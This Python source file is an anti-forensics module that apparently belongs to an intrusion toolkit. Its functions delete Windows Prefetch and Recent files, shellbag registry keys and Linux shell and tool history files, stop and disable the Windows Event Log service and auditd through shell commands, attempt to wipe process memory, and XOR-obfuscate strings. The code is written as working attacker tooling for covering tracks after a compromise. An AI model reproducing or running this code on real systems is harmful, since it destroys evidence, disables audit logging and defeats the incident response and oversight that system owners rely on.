"""Anti-forensics and cleanup module."""
import os
import subprocess

def wipe_memory(pid=None):
    """Overwrite process memory before exit."""
    if os.name == 'nt':
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            sz = 10 * 1024 * 1024
            addr = k32.VirtualAlloc(0, sz, 0x1000, 0x04)
            if addr:
                ctypes.memset(addr, 0x00, sz)
                k32.VirtualFree(addr, 0, 0x8000)
            return '[+] Memory wiped'
        except Exception as e:
            return f'[-] Memory wipe failed: {e}'
    try:
        pid = pid or os.getpid()
        with open(f'/proc/{pid}/mem', 'wb') as f:
            f.write(b'\x00' * 4096)
        return '[+] Memory wiped'
    except Exception as e:
        return f'[-] Memory wipe failed: {e}'

def clean_artifacts():
    """Remove prefetch, recent files, shellbags, and shell history."""
    results = []
    if os.name == 'nt':
        for d, lbl in [
            (os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'Prefetch'), 'prefetch'),
            (os.path.join(os.environ.get('APPDATA', ''), 'Microsoft\\Windows\\Recent'), 'recent'),
        ]:
            try:
                if os.path.isdir(d):
                    for f in os.listdir(d):
                        os.remove(os.path.join(d, f))
                results.append(f'[+] Cleaned {lbl}')
            except Exception:
                pass
        try:
            import winreg
            for sk in (r'Software\Microsoft\Windows\Shell\BagMRU',
                       r'Software\Microsoft\Windows\Shell\Bags'):
                try:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, sk)
                    results.append('[+] Removed shellbag')
                except OSError:
                    pass
        except Exception:
            pass
    else:
        for h in ('~/.bash_history', '~/.zsh_history',
                  '~/.mysql_history', '~/.lesshst', '~/.python_history'):
            hp = os.path.expanduser(h)
            if os.path.isfile(hp):
                os.remove(hp)
                results.append(f'[+] Removed {hp}')
    return '\n'.join(results) if results else '[-] No artifacts cleaned'

def disable_event_logging():
    """Pause Windows Event Log service or disable auditd on Linux."""
    if os.name == 'nt':
        try:
            subprocess.run('sc stop EventLog && sc config EventLog start= disabled',
                           shell=True, capture_output=True, timeout=10)
            return '[+] Windows Event Log disabled'
        except Exception as e:
            return f'[-] Failed: {e}'
    try:
        subprocess.run('systemctl stop auditd 2>/dev/null || service auditd stop 2>/dev/null',
                       shell=True, capture_output=True, timeout=10)
        return '[+] auditd disabled'
    except Exception as e:
        return f'[-] Failed: {e}'

def encrypt_strings(data):
    """XOR-obfuscate data in memory. Returns (key, encrypted_bytes)."""
    import random
    key = random.randint(1, 255)
    return key, bytes([b ^ key for b in (data if isinstance(data, bytes) else data.encode())])
